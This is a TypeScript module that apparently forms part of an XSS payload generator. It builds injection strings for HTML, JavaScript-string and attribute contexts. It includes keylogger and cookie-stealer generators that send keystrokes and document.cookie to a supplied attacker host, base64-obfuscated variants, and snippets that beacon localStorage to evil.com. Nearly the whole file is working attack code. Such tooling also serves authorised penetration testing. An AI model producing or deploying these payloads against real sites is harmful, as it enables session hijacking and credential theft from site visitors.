
import { GeneratorOptions, ContextType, PayloadType } from '../types';

const rc = <T,>(arr: T[]): T | undefined => {
    if (arr.length === 0) return undefined;
    return arr[Math.floor(Math.random() * arr.length)];
};

const jsFunctions = [
    'alert(1)',
    'prompt(document.domain)',
    'confirm`XSS`',
    'parent.postMessage(document.cookie,"*")',
    'navigator.sendBeacon("//evil.com",localStorage)',
    'eval(atob("ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vZXZpbC5jb20i"))',
];

export function generatePayloads(options: GeneratorOptions): string[] {
    switch (options.payloadType) {
        case PayloadType.General:
            return generateGeneralPayloads(options);
        case PayloadType.Keylogger:
            return generateKeyloggerPayloads(options.attackerHost);
        case PayloadType.CookieTheft:
            return generateCookieStealerPayloads(options.attackerHost);
        default:
            return [];
    }
}

function generateGeneralPayloads(options: GeneratorOptions): string[] {
    const payloads = new Set<string>();
    const { contexts, allowedChars, tags: rawTags, attributes: rawAttributes } = options;

    const tags = rawTags.length > 0 ? rawTags : ['script', 'img', 'div', 'svg', 'a', 'iframe'];
    const attributes = rawAttributes.length > 0 ? rawAttributes : ['onload', 'onerror', 'onclick', 'onmouseover', 'src', 'href'];

    const add = (payload: string | undefined) => payload && payloads.add(payload);

    if (contexts.includes(ContextType.HTML)) {
        if (allowedChars.length >= 5) {
            for (let i = 0; i < 5; i++) {
                add(`'><${rc(tags)}>${rc(jsFunctions)}</${rc(tags)}>`);
                add(`'><${rc(tags)} ${rc(attributes)}='${rc(jsFunctions)}'></${rc(tags)}>`);
                add(`'><svg onload=${rc(jsFunctions)}>`);
                add(`'><script>window.name='${rc(jsFunctions)}'</script>`);
            }
        } else if (tags.length === 0 && allowedChars.includes('<') && allowedChars.includes('>')) {
            for (let i = 0; i < 5; i++) {
                add(`'><custom autofocus onfocus=${rc(jsFunctions)}>`);
                add(`'><x contenteditable onblur=${rc(jsFunctions)}>clickme</x>`);
            }
        } else {
            for (const func of jsFunctions) {
                add(`\${${func}}`);
                add(`javascript:${encodeURIComponent(func)}`);
            }
        }
    }

    if (contexts.includes(ContextType.JS_STRING)) {
        if (allowedChars.length >= 5 || (!allowedChars.includes("'") && tags.includes('script'))) {
             for (let i = 0; i < 5; i++) {
                add(`'><script>${rc(jsFunctions)}</script>`);
                add(`"</script><svg onload=${rc(jsFunctions)}>`);
            }
        } else if (!['<', '>', '\\', '"'].every(c => allowedChars.includes(c))) {
            for (let i = 0; i < 5; i++) {
                add(`';${rc(jsFunctions)};//`);
                const func = rc(jsFunctions)?.replace('(', '(1') || '';
                add(`-${func});//`);
            }
        } else {
            for (const func of jsFunctions) {
                add(`\${${func}}`);
                add(`\\u0061lert(1)`);
            }
        }
    }

    if (contexts.includes(ContextType.ATTRIBUTE)) {
        if (allowedChars.length >= 5) {
             for (let i = 0; i < 5; i++) {
                add(`'><${rc(tags)}>${rc(jsFunctions)}</${rc(tags)}>`);
                add(`'><${rc(tags)} ${rc(attributes)}='${rc(jsFunctions)}'></${rc(tags)}>`);
                add(`" autofocus onfocus=${rc(jsFunctions)} "`);
                add(`javascript:${encodeURIComponent(rc(jsFunctions) || '')}`);
            }
        } else if (!allowedChars.includes('<') && !allowedChars.includes('>')) {
            for (let i = 0; i < 5; i++) {
                add(`"${rc(attributes)}:${rc(jsFunctions)}"`);
                add(` ${rc(['onpointerenter','onwebkitanimationstart'])}'=${rc(jsFunctions)}`);
            }
        } else {
            for (const func of jsFunctions) {
                add(`\${${func}}`);
                add(`x="${func}"`);
            }
        }
    }

    return Array.from(payloads);
}

function generateKeyloggerPayloads(attackerHost: string): string[] {
    if (!attackerHost) return ["Error: Attacker Host is required."];
    const EXFIL_URL = `https://${attackerHost}/?k=`;
    
    const jsCode = `document.onkeypress=function(e){new Image().src='${EXFIL_URL}'+e.key}`;
    const encodedJs = btoa(jsCode);

    return [
        `<script>${jsCode}</script>`,
        `<img src=x onerror="${jsCode}">`,
        `<svg onload="${jsCode}"></svg>`,
        `javascript:${jsCode}`,
        `' onkeypress="fetch('${EXFIL_URL}'+event.key)" '`,
        `<script src="data:text/javascript;base64,${encodedJs}"></script>`
    ];
}


function generateCookieStealerPayloads(attackerHost: string): string[] {
    if (!attackerHost) return ["Error: Attacker Host is required."];
    const EXFIL_URL = `https://${attackerHost}/?cookie=`;

    const jsCode = `new Image().src='${EXFIL_URL}'+encodeURIComponent(document.cookie)`;
    const encodedJs = btoa(jsCode);

    return [
        `<img src=x onerror="${jsCode}">`,
        `<svg onload="${jsCode}"></svg>`,
        `javascript:${jsCode}`,
        `<script src="data:text/javascript;base64,${encodedJs}"></script>`,
        `<script>fetch("${EXFIL_URL}"+encodeURIComponent(document.cookie))</script>`,
        `" onload="${jsCode}" "`
    ];
}
